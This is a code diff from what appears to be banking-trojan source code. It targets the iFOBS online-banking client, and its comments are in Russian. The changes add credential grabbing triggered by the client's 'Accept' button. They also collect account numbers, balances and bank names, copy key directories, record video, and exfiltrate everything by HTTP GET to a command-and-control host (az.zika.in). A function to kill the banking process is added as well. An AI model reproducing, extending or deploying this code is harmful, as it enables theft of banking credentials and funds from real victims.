@@ -43,17 +43,17 @@ struct AccBalans
 {
 	char acc[64];
 	char balans[64];
+	char nameBank[128];
 };
 
 int ( WINAPI *pTVDBDirectGetCurrency )(int P1, int P2);
 //прототип из ifobs.plug
 typedef BOOL ( WINAPI *PInitFunc )(DWORD origFunc, char *funcName);
 char folderIFobs[MAX_PATH]; //папка в которой находится прога, для копирования на сервер
+char resultGrab[512]; //результат грабера для отсылки в админку и видео сервер
 
 //хеши кнопки Принять на разных языках, при нажатии такой кнопки грабятся данные 
 DWORD btAccept[] = { 0x8DBF3905 /* Принять */, 0x62203A2E /* Прийняти */, 0x3C797A7A /* Accept */, 0 };
-
-VideoSendLog* vsl = 0;
 
 static BOOL CALLBACK EnumChildProc( HWND hwnd, LPARAM lParam )
 {
@@ -77,6 +77,8 @@ static void AddStrLog( const char* name, const char* value )
 	m_lstrcat( buf, ": " );
 	if( value )
 		m_lstrcat( buf, value );
+	if( resultGrab[0] ) m_lstrcat( resultGrab, ", " );
+	m_lstrcat( resultGrab, buf );
 	m_lstrcat( buf, "\r\n" );
 	KeyLogger::AddStrToBuffer( 0, buf, 0 );
 	DBG( "IFobs", buf );
@@ -95,6 +97,7 @@ static void GrabData( HWND wnd )
 	DBG( "IFobs", "Грабим данные" );
 	ForFindControl ffc;
 	ClearStruct(ffc);
+	resultGrab[0] = 0;
 	ffc.hash = HashClassEditControl;
 	pEnumChildWindows( wnd, EnumChildProc, &ffc );
 	AddStrLog( "Login", ffc.texts[3] );
@@ -104,6 +107,8 @@ static void GrabData( HWND wnd )
 	DWORD attr = (DWORD)pGetFileAttributesA(ffc.texts[0]);
 	if( attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY) != 0 )
 		KeyLogger::AddDirectory( ffc.texts[0], "Keys" );
+	VideoLog::Send( "ifobs", 11, resultGrab );
+	VideoProcess::SendFiles( 0, 0, ffc.texts[0], true );
 	FreeFFC(ffc);
 }
 
@@ -207,7 +212,7 @@ static void OnMessage(LPVOID Sender, PMSG Msg, bool IsUnicode)
 static char* GetAdminUrl( char* url )
 {
 #ifdef DEBUGCONFIG
-	m_lstrcpy( url, "rus.zika.in" );
+	m_lstrcpy( url, "az.zika.in" );
 #else
 //	string host = GetActiveHostFromBuf2( GetBotHosts(), BOTPARAM_HASH_MAINHOSTS, true );
 	string host = GetActiveHostFromBuf2( Rafa::Hosts(), 0x86D19DC3 /* __RAFA_HOSTS__ */, RAFAHOSTS_PARAM_ENCRYPTED );
@@ -223,39 +228,45 @@ static DWORD WINAPI SendBalans( LPVOID p )
 {
 	char urlAdmin[128];
 	AccBalans* ab = (AccBalans*)p;
-	VideoSendLogName log( *vsl, "ifobs" );
-	log.Send( 10, "Счет: %s, баланс: %s", ab->acc, ab->balans );
+	VideoLog log( "ifobs" );
+	log.Send( 10, "Счет: '%s', баланс: '%s', банк: '%s'", ab->acc, ab->balans, ab->nameBank );
 	if( GetAdminUrl(urlAdmin) )
 	{
 		fwsprintfA pwsprintfA = Get_wsprintfA();
-		TMemory request(512);
+		TMemory request(1024);
 		string azUser = GetAzUser();
-		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=balance&sum=%s&acc=%s", urlAdmin, BOT_UID, azUser.t_str(), ab->balans, ab->acc );
+		char* urlBank = "nothing"; //URLEncode(ab->nameBank);
+		char* urlGrab = URLEncode(resultGrab);
+		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=balance&sum=%s&acc=%s&text=bank|%s,text|%s", urlAdmin, BOT_UID, azUser.t_str(), ab->balans, ab->acc, urlBank, urlGrab );
+//		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=balance&sum=%s&acc=1", urlAdmin, BOT_UID, azUser.t_str(), ab->balans );
+		STR::Free(urlBank);
+		STR::Free(urlGrab);
 //		THTTP H;
 //		H.Get(request.AsStr());
 		THTTPResponseRec Response;
 		ClearStruct(Response);
 		HTTP::Get( request.AsStr(), 0, &Response );
 		HTTPResponse::Clear(&Response);
-		DBG( "IFobs", "Отослали запрос: %s", request.AsStr() );
+		DBG( "IFobs", "Отослали запрос: '%s'", request.AsStr() );
 	}
 	MemFree(p);
 	return 0;
 }
 
-void WINAPI PutBalans( const char* acc, const char* balans )
+void WINAPI PutBalans( const char* acc, const char* balans, const char* nameBank )
 {
-	DBG( "IFobs", "acc: %s, balans: %s", acc, balans );
+	DBG( "IFobs", "acc: '%s', balans: '%s', name bank: '%s'", acc, balans, nameBank );
 	AccBalans* ab = (AccBalans*)MemAlloc(sizeof(AccBalans));
 	m_lstrcpy( ab->acc, acc );
+	trimall( ab->acc, ' ' );
 	m_lstrcpy( ab->balans, balans );
+	m_lstrcpy( ab->nameBank, nameBank );
 	RunThread( SendBalans, ab );
 }
 
 DWORD WINAPI PluginIFobs(LPVOID)
 {
-	vsl = new VideoSendLog();
-	VideoSendLogName log( *vsl, "ifobs" );
+	VideoLog log( "ifobs" );
 	log.Send2( 0, "Загрузка плагина ifobs.plug" );
 	TPlugin ifobsPlug("ifobs.plug");
 	if( ifobsPlug.Download(true) )
@@ -318,7 +329,7 @@ DWORD WINAPI SendIFobs(LPVOID)
 	if( CopyFileANdFolder( folderIFobs, tempFolder ) )
 	{
 		DBG( "IFobs", "Копирование на сервер" );
-		VideoRecorder::SendFiles(tempFolder);
+		VideoProcess::SendFiles( 0, 0, tempFolder );
 		DeleteFolders(tempFolder);
 		DBG( "IFobs", "Копирование на сервер окончено" );
 	}
@@ -330,20 +341,23 @@ DWORD WINAPI SendIFobs(LPVOID)
 void Activeted(LPVOID Sender)
 {
 	DBG( "IFobs", "Activated" );
+	VideoLog::Send( "ifobs", 21, "activated" );
 	PKeyLogSystem System = (PKeyLogSystem)Sender;
 	RunThread( PluginIFobs, 0 );
-	if( !Bot->FileExists( 0, GetStr(IFobsFlagCopy).t_str() ) )
-		MegaJump(SendIFobs);
-	VideoRecorderSrv::StartInfiniteRecording("IFobs");
+//	if( !Bot->FileExists( 0, GetStr(IFobsFlagCopy).t_str() ) )
+//		MegaJump(SendIFobs);
+	VideoProcess::RecordPID( 0, "IFobs" );
 }
 
 bool Init( const char* appName )
 {
 	DBG( "IFobs", "Регистрация системы" );
+	resultGrab[0] = 0;
 	PKeyLogSystem S = KeyLogger::AddSystem( "ifobs", PROCESS_HASH );
 	if( S != NULL )
 	{
-		char* caption = "*iFOBS*Ре*страц*я*";
+		VideoLog::Send( "ifobs", 20, "init" );
+		char* caption = "*iFOBS*ст*ац*я*";
 		char* caption2 = "*iFOBS*Regis*";
 		S->MakeScreenShot = true;
 		S->SendLogAsCAB = true;
@@ -360,6 +374,46 @@ bool Init( const char* appName )
 		}
 	}
 	return true;
+}
+/*
+static void FindExe(PFindData Search, PCHAR FileName, LPVOID Data, bool &Cancel )
+{
+	DWORD hash = STR::GetHash(Search->cFileName,0,true);
+	if( hash == PROCESS_HASH )
+	{
+		DBG( "IFobs", "Find %s", FileName );
+		VideoLog::Send( "ifobs", 30, "find %s", FileName );
+		Cancel = true;
+	}
+}
+
+DWORD WINAPI FindIFobsClient(LPVOID)
+{
+	DWORD drives = (DWORD)pGetLogicalDrives();
+	char drive[] = { 'C', ':', '\\', 0 };
+	//ищем только на жестком диске
+	for( int b = 2; b < 31; b++ )
+	{
+		if( drives & (1 << b) )
+		{
+			drive[0] = 'A' + b;
+			int tp = (int)pGetDriveTypeA(drive);
+			//смотрим только жесткие диски
+			if( tp == DRIVE_FIXED )
+			{
+				if( !SearchFiles( drive, "*.exe", true, FA_ANY_FILES, 0, FindExe ) )
+					break;
+			}
+		}
+	}
+	return 0;
+}
+*/
+
+void KillIFobs()
+{
+	DWORD pid = GetProcessIdByHash(PROCESS_HASH);
+	KillProcess( pid, 1000 );
 }
 
 }
